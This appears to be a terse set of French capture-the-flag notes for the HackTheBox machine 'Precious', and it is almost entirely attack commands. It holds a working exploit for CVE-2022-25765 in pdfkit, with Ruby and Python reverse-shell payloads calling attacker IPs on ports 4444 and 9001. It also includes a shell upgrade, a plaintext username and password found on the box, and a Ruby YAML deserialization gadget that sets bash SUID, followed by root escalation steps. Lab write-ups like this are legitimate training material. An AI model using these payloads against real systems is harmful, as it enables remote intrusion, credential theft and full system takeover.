# ip
10.10.11.189 

# exploit
nginx/1.18.0 + Phusion Passenger(R) 6.0.15

# faille
pdfkit v0.8.6
cve 2022-25765
http:// /

# md5 interessant
cb83a580e3465f4438dc022656b29c21

# curl
curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.122%3A8000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2C4444%29%29%27%60'

# webpage
http://10.10.14.122:8000/?name=` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.122",4444))')

# shell interactif
python3 -c 'import pty; pty.spawn("/bin/sh")'

# reverse shell
http://example.com/?name=#{'%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.110",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`'}

# henry
.bundle/config:BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

# ssh connection
user : henry
pass : Q3c1AqGHtoI0aXAYFH

# dependencies.yml suid bash 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve

# root privilege
cp -r /usr/bin/bash ./
chmod +s bash
touch test
bash test -exec whoami \;
id 